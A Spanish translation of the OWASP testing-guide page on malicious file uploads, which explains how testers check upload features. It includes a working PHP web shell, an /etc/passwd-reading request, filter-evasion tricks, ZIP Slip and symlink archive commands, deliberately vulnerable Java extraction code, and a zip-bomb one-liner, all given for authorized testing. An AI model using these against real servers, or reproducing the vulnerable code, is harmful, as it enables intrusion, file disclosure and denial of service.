# Subida de archivos maliciosos

|ID          |
|------------|
|WSTG-BUSL-09|

## Resumen

Muchos procesos de negocio de las aplicaciones permiten que los usuarios suban datos. Aunque la validación de entradas se comprende ampliamente en el caso de los campos de texto, es más complicado implementarla cuando se aceptan archivos. Aunque muchos sitios implementan restricciones sencillas basadas en una lista de extensiones permitidas (o bloqueadas), esto no basta para impedir que los atacantes suban tipos de archivo legítimos con contenido malicioso.

Las vulnerabilidades relacionadas con la subida de archivos maliciosos son particulares, ya que estos archivos «maliciosos» pueden rechazarse fácilmente si se incorpora lógica de negocio que los analice durante el proceso de subida y rechace aquellos que se consideren maliciosos. Además, esto difiere de la subida de archivos inesperados, porque, aunque se acepte el tipo de archivo, este aún puede ser malicioso para el sistema.

Por último, «malicioso» significa cosas distintas para cada sistema. Por ejemplo, los archivos maliciosos que podrían explotar vulnerabilidades de SQL Server quizá no se consideren «maliciosos» en un entorno que utiliza un almacén de datos NoSQL.

La aplicación podría permitir que se suban archivos maliciosos que contengan exploits o shellcode sin someterlos a un análisis de archivos maliciosos. Los archivos maliciosos podrían detectarse y detenerse en varios puntos de la arquitectura de la aplicación, como un sistema de detección o prevención de intrusiones, software antivirus en el servidor de aplicaciones o análisis antivirus de los archivos a medida que se suben a la aplicación (quizás delegando el análisis mediante SCAP).

### Ejemplo

Un ejemplo común de esta vulnerabilidad es una aplicación, como un blog o un foro, que permite a los usuarios subir imágenes y otros archivos multimedia. Aunque se consideran seguros, si un atacante puede subir código ejecutable (como un script PHP), podría ejecutar comandos del sistema operativo, leer y modificar información del sistema de archivos, acceder a la base de datos del backend y comprometer por completo el servidor.

## Objetivos de prueba

- Identificar la funcionalidad de subida de archivos.
- Revisar la documentación del proyecto para identificar qué tipos de archivo se consideran aceptables y cuáles se considerarían peligrosos o maliciosos.
    - Si no hay documentación disponible, considerar qué sería apropiado según el propósito de la aplicación.
- Determinar cómo se procesan los archivos subidos.
- Obtener o crear un conjunto de archivos maliciosos para realizar pruebas.
- Intentar subir los archivos maliciosos a la aplicación y determinar si se aceptan y procesan.

## Cómo probar

### Tipos de archivos maliciosos

Las comprobaciones más sencillas que puede realizar una aplicación consisten en determinar que solo se puedan subir tipos de archivo confiables.

#### Web shells

Si el servidor está configurado para ejecutar código, podría ser posible obtener ejecución de comandos en el servidor al subir un archivo conocido como web shell, que permite ejecutar código arbitrario o comandos del sistema operativo. Para que este ataque tenga éxito, el archivo debe subirse dentro del directorio raíz web y el servidor debe estar configurado para ejecutar el código.

Subir este tipo de shell a un servidor expuesto a Internet es peligroso, porque permite que cualquiera que conozca (o adivine) su ubicación ejecute código en el servidor. Se pueden usar varias técnicas para proteger el shell contra el acceso no autorizado, como las siguientes:

- Subir el shell con un nombre generado aleatoriamente.
- Proteger el shell con una contraseña.
- Implementar restricciones basadas en IP para el shell.

**Recuerda eliminar el shell cuando hayas terminado.**

El siguiente ejemplo muestra un shell sencillo basado en PHP que ejecuta comandos del sistema operativo pasados mediante un parámetro GET y al que solo se puede acceder desde una dirección IP específica:

```php
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```

Una vez que se haya subido el shell (con un nombre aleatorio), se pueden ejecutar comandos del sistema operativo pasándolos en el parámetro GET `cmd`:

`https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd`

#### Evasión de filtros

El primer paso consiste en determinar qué permiten o bloquean los filtros y dónde están implementados. Si las restricciones se aplican en el cliente mediante JavaScript, se pueden evadir fácilmente con un proxy de interceptación.

Si el filtrado se realiza en el servidor, se pueden intentar varias técnicas para evadirlo, entre ellas:

- Cambiar el valor de `Content-Type` a `image/jpeg` en la solicitud HTTP.
- Cambiar las extensiones por otras menos comunes, como `file.php5`, `file.shtml`, `file.asa`, `file.jsp`, `file.jspx`, `file.aspx`, `file.asp`, `file.phtml`, `file.cshtml`
- Usar extensiones dobles, como `file.jpg.php` o `file.png.php`. Para que esto funcione correctamente, primero se debe comprender cómo maneja el servidor web los archivos con múltiples extensiones. Por ejemplo, en ciertos escenarios, el servidor web podría comprobar únicamente si `.jpg` o `.png` forma parte de la extensión del archivo, lo que podría permitir a los atacantes evadir el filtro de extensiones.
- Cambiar la [firma del archivo](https://en.wikipedia.org/wiki/List_of_file_signatures) o el byte mágico del archivo subido.
- Cambiar las mayúsculas y minúsculas de la extensión, como en `file.PhP` o `file.AspX`
- Si la solicitud incluye varios nombres de archivo, cambiarlos por valores diferentes.
- Usar caracteres especiales al final, como espacios, puntos o caracteres nulos; por ejemplo, `file.asp...`, `file.php;jpg`, `file.asp%00.jpg`, `1.jpg%00.php`
- En versiones de Nginx mal configuradas, subir un archivo como `test.jpg/x.php` podría permitir que se ejecute como `x.php`.
- Subir un archivo `.htaccess` con el siguiente contenido: `AddType application/x-httpd-php .png`. Esto hará que el servidor Apache ejecute las imágenes `.png` como si fueran recursos `.php`.

En algunas situaciones, quizá sea necesario combinar las distintas técnicas de evasión de filtros descritas anteriormente para evadir correctamente los filtros del servidor.**

### Contenido de archivos maliciosos

Una vez validado el tipo de archivo, también es importante asegurarse de que su contenido sea seguro. Esto es mucho más difícil, ya que los pasos necesarios variarán según los tipos de archivo permitidos.

#### Malware

Por lo general, las aplicaciones deberían analizar los archivos subidos con software antimalware para asegurarse de que no contengan nada malicioso. La forma más sencilla de comprobarlo es usar el [archivo de prueba EICAR](https://www.eicar.org/download-anti-malware-testfile/), un archivo seguro que todos los programas antimalware identifican como malicioso.

Según el tipo de aplicación, podría ser necesario probar otros tipos de archivo peligrosos, como documentos de Office que contengan macros maliciosas. Se pueden usar herramientas como [Metasploit Framework](https://github.com/rapid7/metasploit-framework) y [Social Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) para generar archivos maliciosos de varios formatos.

Cuando se suba este archivo, la aplicación debería detectarlo y ponerlo en cuarentena o eliminarlo. Según cómo procese la aplicación el archivo, quizá no sea evidente si esto ha ocurrido.

#### Traversal de directorios en archivos comprimidos

Si la aplicación extrae archivos comprimidos (como archivos ZIP), podría ser posible escribir en ubicaciones no previstas mediante traversal de directorios. Esto se puede explotar subiendo un archivo ZIP malicioso que contenga rutas que recorran el sistema de archivos mediante secuencias como `..\..\..\..\shell.php`. Esta técnica se describe con más detalle en el [aviso de snyk](https://security.snyk.io/research/zip-slip-vulnerability).

Una prueba de traversal de directorios en archivos comprimidos debe incluir dos partes:

1. Un archivo comprimido malicioso que salga del directorio de destino al extraerse. Este archivo debe contener dos archivos: un archivo `base`, que se extraiga en el directorio de destino, y un archivo `traversed` que intente subir por el árbol de directorios hasta llegar a la carpeta raíz y añadir un archivo al directorio `tmp`. Una ruta maliciosa contendrá muchos niveles de `../` (*es decir*, `../../../../../../../../tmp/traversed`) para aumentar las posibilidades de llegar al directorio raíz. Cuando el ataque tenga éxito, el evaluador podrá encontrar `/tmp/traversed` creado en el servidor web mediante el ataque ZIP Slip.
2. Lógica que extraiga archivos comprimidos, ya sea mediante código personalizado o una biblioteca. Las vulnerabilidades de traversal de directorios en archivos comprimidos se producen cuando la funcionalidad de extracción no valida las rutas de los archivos del archivo comprimido. El siguiente ejemplo muestra una implementación vulnerable en Java:

```java
Enumeration<ZipEntry> entries =​ ​zip​.g​etEntries();

while(entries​.h​asMoreElements()){
    ZipEntry e ​= ​entries.nextElement();
    File f = new File(destinationDir, e.getName());
    InputStream input = zip​.g​etInputStream(e);
    IOUtils​.c​opy(input, write(f));
}
```

Sigue los pasos siguientes para crear un archivo ZIP que pueda aprovechar el código vulnerable anterior una vez subido al servidor web:

```bash
# Open a new terminal and create a tree structure
# (more directory levels might be required based on the system being targeted)
mkdir -p a/b/c
# Create a base file
echo 'base' > a/b/c/base
# Create a traversed file
echo 'traversed' > traversed
# You can double check the tree structure using `tree` at this stage
# Navigate to a/b/c root directory
cd a/b/c
# Compress the files
zip test.zip base ../../../traversed
# Verify compressed files content
unzip -l test.zip
```

#### Ataques de enlaces simbólicos en archivos comprimidos

Si la aplicación extrae archivos comprimidos (como ZIP o TAR), es importante verificar cómo se manejan los enlaces simbólicos que contiene el archivo. A diferencia del traversal de directorios en archivos comprimidos (ZIP Slip), esta técnica no depende de secuencias de traversal de rutas `../`.

Un atacante puede crear un archivo comprimido que contenga un enlace simbólico que apunte a un archivo confidencial del servidor (por ejemplo, `/etc/passwd`). Si el proceso de extracción conserva los enlaces simbólicos sin validarlos y la aplicación procesa o expone posteriormente los archivos extraídos, esto podría dar lugar a un acceso no previsto a archivos confidenciales del sistema.

Por ejemplo, un archivo comprimido malicioso podría contener: `link.txt -> /etc/passwd`

Si el backend extrae este archivo sin validar ni rechazar los enlaces simbólicos y la aplicación lee `link.txt`, podría revelar inadvertidamente el contenido de `/etc/passwd`.

##### Cómo probar

1. Crear un enlace simbólico: `ln -s /etc/passwd link.txt`
1. Crear un archivo comprimido: `tar -czf malicious.tar.gz link.txt`
1. Subir el archivo comprimido a la aplicación.
1. Comprobar:
   - ¿Se extrae el enlace simbólico?
   - ¿Sigue la aplicación el enlace?
   - ¿Se puede acceder al contenido de archivos confidenciales?

##### Impacto

- Lectura arbitraria de archivos
- Divulgación de información confidencial

#### Bombas ZIP

Una [bomba ZIP](https://en.wikipedia.org/wiki/zip_bomb) (más generalmente conocida como bomba de descompresión) es un archivo comprimido que contiene un gran volumen de datos. Su objetivo es provocar una denegación de servicio al agotar el espacio en disco o la memoria del sistema de destino que intenta extraer el archivo. Aunque el formato ZIP es el ejemplo más usado, también se ven afectados otros formatos, incluido gzip (que se usa con frecuencia para comprimir datos en tránsito).

En su forma más sencilla, se puede crear una bomba ZIP comprimiendo un archivo grande compuesto por un solo carácter. El siguiente ejemplo muestra cómo crear un archivo de 1MB que se descomprimirá hasta alcanzar 1GB:

```bash
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```

Hay varios métodos para lograr relaciones de compresión mucho mayores, como usar varios niveles de compresión, [abusar del formato ZIP](https://www.bamsoftware.com/hacks/zipbomb/) y utilizar [quines](https://research.swtch.com/zip) (archivos comprimidos que contienen una copia de sí mismos y provocan una recursión infinita).

Un ataque exitoso con una bomba ZIP provocará una denegación de servicio y también puede aumentar los costos si se utiliza una plataforma de nube con escalado automático. **No lleves a cabo este tipo de ataque a menos que hayas considerado estos riesgos y cuentes con autorización por escrito para hacerlo.**

#### Archivos XML

Los archivos XML presentan varias vulnerabilidades potenciales, como XML eXternal Entities (XXE) y ataques de denegación de servicio, como el [ataque de los mil millones de risas](https://en.wikipedia.org/wiki/Billion_laughs_attack).

Estos temas se describen con más detalle en la guía sobre [inyección XML](../07-Injection/07-XML_Injection.md).

#### Otros formatos de archivo

Muchos otros formatos de archivo también presentan riesgos de seguridad específicos que deben tenerse en cuenta, como los siguientes:

- Se debe comprobar que el tamaño máximo en píxeles o fotogramas de los archivos de imagen no se exceda.
- Los archivos CSV podrían permitir [ataques de inyección CSV](https://owasp.org/www-community/attacks/CSV_Injection).
- Los archivos de Office podrían contener macros maliciosas o código de PowerShell.
- Los archivos PDF podrían contener JavaScript malicioso.

Los formatos de archivo permitidos deben revisarse cuidadosamente para detectar funcionalidades potencialmente peligrosas y, cuando sea posible, se deben intentar explotar durante las pruebas.

### Revisión del código fuente

Cuando se admite la funcionalidad de subida de archivos, es común encontrar las siguientes API o métodos en el código fuente:

- Java: `new file`, `import`, `upload`, `getFileName`, `Download`, `getOutputString`
- C/C++: `open`, `fopen`
- PHP: `move_uploaded_file()`, `Readfile`, `file_put_contents()`, `file()`, `parse_ini_file()`, `copy()`, `fopen()`, `include()`, `require()`

## Casos de prueba relacionados

- [Manejo de extensiones de archivo para información confidencial](../02-Configuration_and_Deployment_Management/03-File_Extensions_Handling_for_Sensitive_Information.md)
- [Inyección XML](../07-Injection/07-XML_Injection.md)
- [Prueba de subida de tipos de archivo inesperados](08-Upload_of_Unexpected_File_Types.md)

## Remediación

La protección completa contra la subida de archivos maliciosos puede ser compleja, y los pasos exactos necesarios variarán según los tipos de archivos que se suban y cómo se procesen o analicen en el servidor. Esto se explica con más detalle en la [hoja de referencia sobre subida de archivos](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html).

## Herramientas

- Funcionalidad de generación de cargas útiles de Metasploit
- Proxy de interceptación

## Referencias

- [OWASP - File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Why File Upload Forms are a Major Security Threat](https://www.acunetix.com/websitesecurity/upload-forms-threat/)
- [8 Basic Rules to Implement Secure File Uploads](https://www.sans.org/blog/8-basic-rules-to-implement-secure-file-uploads)
- [Stop people uploading malicious PHP files via forms](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)
- [How to Tell if a File is Malicious](https://web.archive.org/web/20210710090809/https://www.techsupportalert.com/content/how-tell-if-file-malicious.htm)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [Implementing Secure File Upload](https://infosecauditor.wordpress.com/tag/malicious-file-upload/)
- [Metasploit Generating Payloads](https://www.offsec.com/metasploit-unleashed/generating-payloads/)
- [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)